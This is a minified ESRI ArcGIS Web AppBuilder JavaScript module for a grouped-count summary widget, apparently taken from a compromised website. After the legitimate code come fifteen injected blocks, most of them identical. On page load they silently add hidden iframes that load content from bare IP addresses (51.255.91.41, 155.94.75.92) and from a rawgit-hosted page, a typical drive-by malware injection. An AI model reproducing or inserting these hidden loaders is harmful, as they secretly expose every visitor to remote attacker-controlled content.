// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define("dojo/_base/declare dojo/Evented dojo/_base/array dojo/DeferredList dojo/Deferred dojo/_base/lang dojo/_base/Color dojo/dom dojo/dom-class dojo/dom-construct dojo/dom-geometry dojo/dom-style dojo/number dojo/on dojo/has dijit/form/Button jimu/dijit/Popup jimu/utils jimu/dijit/Message esri/config esri/geometry/geometryEngine esri/geometry/mathUtils esri/geometry/Point esri/geometry/webMercatorUtils esri/graphic esri/layers/FeatureLayer esri/symbols/SimpleMarkerSymbol esri/symbols/SimpleLineSymbol esri/symbols/Font esri/symbols/TextSymbol esri/tasks/query ./analysisUtils".split(" "),
function(B,C,w,x,u,n,F,G,q,r,H,I,D,v,J,K,L,y,z,M,N,O,P,Q,E,t,R,S,T,U,A,p){return B("GroupedCountInfo",[C],{summaryLayer:null,summaryFields:[],summaryIds:[],summaryFeatures:[],tabNum:null,popupFields:[],groupedResults:{},specialFields:null,dateFields:{},symbolField:null,graphicsLayer:null,lyrRenderer:null,lyrSymbol:null,featureCount:0,incidentCount:0,displayCount:!1,allFields:!1,constructor:function(a,c,e){this.tab=a;this.container=c;this.parent=e;this.config=e.config;this.graphicsLayer=null;this.specialFields=
{};this.typeIdField="";this.types=[];this.dateFields={};this.baseLabel=""!==a.label?a.label:a.layerTitle?a.layerTitle:a.layers},queryTabCount:function(a,c,e,g){var h=new u;this.displayCount=g;this.incidentCount=a.length;var d=[this.tab.tabLayers[0]];this.mapServiceLayer&&1<this.tab.tabLayers.length&&(d=[this.tab.tabLayers[1]]);if(0<this.tab.tabLayers.length&&this.tab.tabLayers[0].url&&-1<this.tab.tabLayers[0].url.indexOf("MapServer")){this.mapServiceLayer=!0;var b;"undefined"!==typeof this.tab.tabLayers[0].infoTemplate?
(this.summaryLayer=this.tab.tabLayers[0],this.summaryLayer.hasOwnProperty("loaded")&&this.summaryLayer.loaded?(this.summaryFields=this._getFields(this.summaryLayer),this._performQuery(a,c,e,g,d).then(function(a){h.resolve(a)})):(b=new t(this.summaryLayer.url),b.infoTemplate=this.tab.tabLayers[0].infoTemplate,d=[b],this.tab.tabLayers=d,v(b,"load",n.hitch(this,function(){this.summaryLayer=b;this.summaryFields=this._getFields(this.summaryLayer);this._performQuery(a,c,e,g,d).then(function(a){h.resolve(a)})})))):
this.loading||(b=new t(this.tab.tabLayers[0].url),this.loading=!0,v(b,"load",n.hitch(this,function(){this.summaryLayer=b;this.summaryFields=this._getFields(this.summaryLayer);for(var k=this.tab.tabLayers[0].url.split("MapServer/")[1],f=this.parent.map.itemInfo.itemData.operationalLayers,l=0;l<f.length;l++){var m=f[l];if("undefined"!==typeof m.layerObject&&m.layerObject.infoTemplates&&(m=m.layerObject.infoTemplates[k])){b.infoTemplate=m.infoTemplate;break}}d=[b];this.tab.tabLayers=d;this.loading=!1;
this._performQuery(a,c,e,g,d).then(function(a){h.resolve(a)})})))}this.mapServiceLayer||this._performQuery(a,c,e,g,d).then(function(a){h.resolve(a)});return h},_performQuery:function(a,c,e,g,h){var d=new u,b=[],k,f;0<c.length?f=p.getGeoms(c):0<a.length&&(f=p.getGeoms(a));this.summaryGeoms=f;if(0<f.length)for(a=0;a<f.length;a++)b=f[a],c=p.createDefArray(h,b),k=0===a?b=c:b=k.concat(c);(new x(b)).then(n.hitch(this,function(a){for(var c=0,b=0;b<a.length;b++){var f=a[b][1];isNaN(f)?f&&f.features?c+=f.features.length:
f&&"undefined"!==typeof f.length&&(c+=f.length):c+=f}this.updateTabCount(c,e,g);this.queryOnLoad&&n.hitch(this,this._queryFeatures(this.summaryGeoms));d.resolve(c)}));return d},updateTabCount:function(a,c,e){this.displayCount=e;this.featureCount=a;p.updateTabCount(this.featureCount,c,e,this.baseLabel,this.incidentCount)},updateForIncident:function(a,c,e,g,h,d,b){this.incidentCount=a.length;this.allFields="undefined"!==typeof d&&"undefined"!==typeof b?d?!0:b:!1;var k="undefined"!==typeof h,f;this.tabNum=
g;k?f=new u:(this.container.innerHTML="",q.add(this.container,"loading"));this.summaryIds=[];this.summaryFeatures=[];this.groupedResults={};if(0<this.tab.tabLayers.length){var l=[];if(0<c.length)l=c;else for(c=0;c<a.length;c++)g=a[c].geometry?a[c].geometry:a[c],"polygon"===g.type&&l.push(g);var m;"undefined"!==typeof this.tab.tabLayers[0].infoTemplate?(this.summaryLayer=this.tab.tabLayers[0],m=new t(this.summaryLayer.url),m.infoTemplate=this.tab.tabLayers[0].infoTemplate,this.tab.tabLayers[1]=m,this.summaryFields=
this._getFields(this.tab.tabLayers[0]),k?this._queryFeatures(l,k).then(function(a){f.resolve(a)}):(this._initGraphicsLayer(e),n.hitch(this,this._queryFeatures(l,k)))):(m=new t(this.tab.tabLayers[0].url),v(m,"load",n.hitch(this,function(){this.summaryLayer=m;if(-1<this.tab.tabLayers[0].url.indexOf("MapServer"))for(var a=this.tab.tabLayers[0].url.split("MapServer/")[1],c=this.parent.map.itemInfo.itemData.operationalLayers,b=0;b<c.length;b++){var d=c[b];if("undefined"!==typeof d.layerObject&&d.layerObject.infoTemplates&&
(d=d.layerObject.infoTemplates[a])){m.infoTemplate=d.infoTemplate;break}}this.tab.tabLayers[1]=m;this.summaryFields=this._getFields(this.tab.tabLayers[1]);k?this._queryFeatures(l,k).then(function(a){f.resolve(a)}):(this._initGraphicsLayer(e),n.hitch(this,this._queryFeatures(l)))})));if(k)return f}},_initGraphicsLayer:function(a){null!==a&&(this.graphicsLayer=a,this.graphicsLayer.clear(),this.summaryLayer&&(this.summaryLayer.renderer&&(this.lyrRenderer=this.summaryLayer.renderer,this.graphicsLayer.renderer=
this.lyrRenderer,"undefined"!==typeof this.summaryLayer.renderer.attributeField?this.symbolField=this.summaryLayer.renderer.attributeField:this.lyrSymbol=this.lyrRenderer.symbol),null===this.specialFields&&p.getSpecialFields(this.summaryLayer)))},_queryFeatures:function(a,c){var e;c&&(e=new u);var g=[],h=this.tab.tabLayers[0].id,d="";this.parent.opLayers.traversal(function(a){if(h===a.id&&a.getFilter())return d=a.getFilter(),!0});for(var b=new A,k=0;k<a.length;k++)b.geometry=a[k],b.where=d,g.push(this.summaryLayer.queryIds(b));
(new x(g)).then(n.hitch(this,function(a){for(var b,d,f=0;f<a.length;f++)a[f][0]&&(b=a[f][1],d=b=0===f?b:d.concat(b));b?(this.summaryIds=b,0<this.summaryIds.length?c?this._queryFeaturesByIds(c).then(function(a){e.resolve(a)}):this._queryFeaturesByIds():c||this._processResults()):c||this._processResults()}),n.hitch(this,function(a){console.error(a);new z({message:a})}));if(c)return e},_queryFeaturesByIds:function(a){var c,e=[];a&&(c=new u);var g=this.summaryLayer.maxRecordCount||1E3,h=this.summaryIds.slice(0,
g);this.summaryIds.splice(0,g);var d=new A,b=!1;w.some(this.summaryFields,n.hitch(this,function(a){if("area"===a.type||"length"===a.type||this.graphicsLayer)return b=!0}));a&&(b=!0);d.returnGeometry=b;d.outSpatialReference=this.parent.map.spatialReference;var k=[];w.forEach(this.summaryFields,function(a){k.push(a.field)});this.symbolField&&k.push(this.symbolField);if(!0===this.config.csvAllFields||"true"===this.config.csvAllFields)d.outFields=["*"];else{if(0<this.popupFields.length)for(var f=0;f<
this.popupFields.length;f++){var l=this.popupFields[f];-1===k.indexOf(l)&&k.push(l)}d.outFields=k}d.objectIds=h;for(e.push(this.summaryLayer.queryFeatures(d));0<this.summaryIds.length;)h=this.summaryIds.slice(0,g),this.summaryIds.splice(0,g),d.objectIds=h,e.push(this.summaryLayer.queryFeatures(d));(new x(e)).then(n.hitch(this,function(b){for(var d=0;d<b.length;d++)if(b[d][0]){var e=b[d][1];e.features&&(this.summaryFeatures=this.summaryFeatures.concat(e.features))}a?this._processResults(a).then(n.hitch(this,
function(a){this.SA_SAT_download&&q.replace(this.SA_SAT_download,"download","processing");c.resolve(a)})):(this._processResults(),this.SA_SAT_download&&q.replace(this.SA_SAT_download,"download","processing"));this.SA_SAT_download&&q.replace(this.SA_SAT_download,"download","processing")}),n.hitch(this,function(a){console.error(a);new z({message:a})}));if(a)return c},_prepGroupedResults:function(){for(var a=0;a<this.summaryFeatures.length;a++){var c=this.summaryFeatures[a];if("undefined"!==typeof this.summaryFields&&
0<this.summaryFields.length){var e=p.getFieldValue(this.summaryFields[0].field,c.attributes[this.summaryFields[0].field],this.specialFields,this.dateFields,"longMonthDayYear",this.typeIdField,this.types),e="undefined"!==typeof e&&null!==e?y.stripHTML(e.toString()):"";e in this.groupedResults?this.groupedResults[e].features.push(c):this.groupedResults[e]={features:[c]}}}},_prepResults:function(){for(var a in this.groupedResults){var c=this.summaryFields[0];c.total=this.groupedResults[a].features.length;
this.groupedResults[a].total=c.total;this.groupedResults[a].type=c.type;this.groupedResults[a].label=c.alias}},_processResults:function(a){this._prepGroupedResults();this._prepResults();var c=this.groupedResults,e=0,g,h;if(a)h=new u;else{this.container.innerHTML="";q.remove(this.container,"loading");if(0===Object.keys(this.groupedResults).length){this.container.innerHTML=this.parent.nls.noFeaturesFound;return}var d=Object.keys(this.groupedResults).length+1;g=r.create("div",{style:"width:"+220*d+"px;"},
this.container);q.add(g,"SAT_tabPanelContent");d=r.create("div",{},g);q.add(d,"SATcolExport");q.add(d,this.parent.lightTheme?"lightThemeBorder":"darkThemeBorder");d=r.create("div",{"data-dojo-attach-point":"SA_SAT_download",title:this.parent.nls.downloadCSV},d);q.add(d,[this.parent.isBlackTheme?"btnExportBlack":"btnExport","download"]);v(d,"click",n.hitch(this,this._exportToCSV,c))}var b=Object.keys(c).sort(),d=[];this.displayCount&&d.push({total:this.featureCount,a:void 0,info:this.parent.nls.count,
c:void 0});for(var k in b){var e=b[k],f=c[e],l=y.stripHTML(e.toString()),e=e===this.parent.nls.area||e===this.parent.nls.length?f.total:Math.round(f.total);isNaN(e)&&(e=0);var e=D.format(e),m="pre"===f.type?f.label.trim():l,l="pre"===f.type?l:f.label.trim(),f=""!==f.label?"colGroupedSummary":"colSummary";if(a)d.push({total:e,a:m,info:""===l?m:l,c:f});else{var p=r.create("div",{"class":"SATcol"},g);q.add(p,this.parent.lightTheme?"lightThemeBorder":"darkThemeBorder");var t=r.create("div",{style:"max-height: 45px;"},
p);r.create("div",{"class":"SATcolWrap",style:"max-height: 30px; overflow: hidden;",innerHTML:m},t);r.create("div",{"class":"SATcolWrap",style:"max-height: 30px; overflow: hidden;",innerHTML:l},t);r.create("div",{"class":f,innerHTML:e},p)}}c=[];k=null!==this.graphicsLayer;!a&&k&&(this.graphicsLayer.clear(),this.tab.tabLayers[1]&&this.tab.tabLayers[1].clear());if(this.summaryFeatures)for(g=0;g<this.summaryFeatures.length;g++)b=this.summaryFeatures[g],this.lyrSymbol?b.symbol=this.lyrSymbol:this.graphicsLayer?
this.graphicsLayer.renderer&&(e=this.graphicsLayer.renderer.getSymbol(b),b.symbol=e):this.summaryLayer.renderer&&this.summaryLayer.renderer.getSymbol&&(b.symbol=this.summaryLayer.renderer.getSymbol(b)),b=b.toJson?new E(b.toJson()):b,!a&&k?(this.graphicsLayer.add(b),this.tab.tabLayers[1].add(b)):c.push(b);!a&&k&&(this.graphicsLayer.setVisibility(!0),this.parent._toggleTabLayersNew(this.tabNum),this.tab.retsore&&this.emit("summary-complete",{bubbles:!0,cancelable:!0,tab:this.tabNum}));if(a)return h.resolve({graphics:c,
analysisResults:d,context:this}),h},_exportToCSV:function(a,c,e,g){a=p.exportToCSV(this.summaryFeatures,c,e,g,{type:"grouped",baseLabel:this.baseLabel,csvAllFields:this.parent.config.csvAllFields,layer:this.summaryLayer,opLayers:this.parent.opLayers,nlsValue:this.parent.nls.groupedSummary,nlsCount:this.parent.nls.count,summaryFields:this.summaryFields});this.summaryLayer=a.summaryLayer;return a.details},_getFields:function(a){var c=p.getSkipFields(a),e,g=[];if("undefined"!==typeof this.tab.advStat){var h=
this.tab.advStat.stats,d;for(d in h)0<h[d].length&&w.forEach(h[d],function(a){var b={field:a.expression,alias:a.label+"",type:d,total:0};e=a.expression;g.push(b)})}h=p.getSpecialFields(a);this.dateFields=h.dateFields;this.specialFields=h.specialFields;this.typeIdField=h.typeIdField;this.types=h.types;if(this.allFields)for(h=0;h<a.fields.length;h++){var b=a.fields[h];-1===c.indexOf(b.name)&&e!==b.name&&g.push({field:b.name,alias:b.alias,type:b.type})}return g}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});